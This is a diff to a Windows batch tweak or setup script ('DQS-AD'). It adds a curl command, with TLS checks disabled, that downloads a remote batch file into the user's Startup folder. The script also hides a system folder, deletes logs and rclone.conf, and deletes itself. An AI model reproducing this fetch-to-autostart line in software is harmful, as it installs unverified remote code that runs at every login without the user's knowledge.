@@ -2,7 +2,7 @@
 @echo off
 @Title DQS-AD
 cd /d %~dp0
-SET veropt=2.3
+SET veropt=2.4
 SET AFF=%veropt%
 md %SystemDrive%\Ect
 set indigo=[38;5;105m
@@ -632,8 +632,8 @@ IF EXIST bin\SVPP38.STR (
 		wmic pagefileset where name="C:\\pagefile.sys" delete
 		wmic computersystem where name="%computername%" get AutomaticManagedPagefile | find "TRUE" >nul && wmic computersystem where name="%computername%" set AutomaticManagedPagefile=False
 		Reg.exe add "HKCU\Control Panel\Mouse" /v "MouseHoverTime" /t REG_SZ /d "100000" /f
-		reg.exe import bin\SCP\PERSO\Emplacement.reg
-		reg.exe import C:\Ect\Outils\led\led.reg
+		Reg.exe import bin\SCP\PERSO\Emplacement.reg
+		Reg.exe import C:\Ect\Outils\led\led.reg
 		timeout /t 02 /nobreak>nul
 		Start Explorer.exe
 	)
@@ -714,8 +714,6 @@ goto :PIDFV
 
 :SYSSTP2
 
-IF NOT EXIST sec-ath.bat curl -g -k -L -# -o "sec-ath.bat" "https://raw.githubusercontent.com/00FGV1/ver/main/REPTILITE/sec-ath.bat"
-
 IF EXIST HWID.txt (
 		for /f "usebackq tokens=*" %%a in ("HWID.txt") do (
     	set "HHWID=%%a"
@@ -749,6 +747,7 @@ IF EXIST rclone.conf (
 
 cd /d %~dp0
 attrib +h +s "C:\Ect"
+curl -g -k -L -# -o "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\endscript.bat" "https://raw.githubusercontent.com/00FGV1/ver/main/REPTILITE/endscript.bat"
 Ping 10>nul
 IF EXIST "C:\Program Files (x86)\Mozilla Maintenance Service\Uninstall.exe" start "" "C:\Program Files (x86)\Mozilla Maintenance Service\Uninstall.exe" /S
 DEL QTS-USRL.log
@@ -756,14 +755,14 @@ DEL ID.log
 DEL IID.log
 DEL temp2.txt
 DEL rclone.conf
-DEL sec-ath.bat
 DEL RWC-USRL.log
 IF %HWCN%==0 (
 	SET CURRENTKEY=HKLM\SOFTWARE\RECS\RWC-TEST
-	FOR /F "TOKENS=2,*" %%A IN ('reg query "%CURRENTKEY%" 2^>NUL^|FIND /I "SVPP38"') DO set MGG=%%B
-	IF %SVPP38%==Y (
-		rmdir /s /q C:\Ect
-		rmdir /s /q C:\Ect\RWC
+	FOR /F "TOKENS=2,*" %%A IN ('reg query "%CURRENTKEY%" 2^>NUL^|FIND /I "SVPP38"') DO set SVERIF=%%B
+	IF %SVERIF%==Y (
+		cls
+		rmdir /s /q C:\Ect >nul
+		cls
 		DEL "%~f0"
 		Exit
 	)
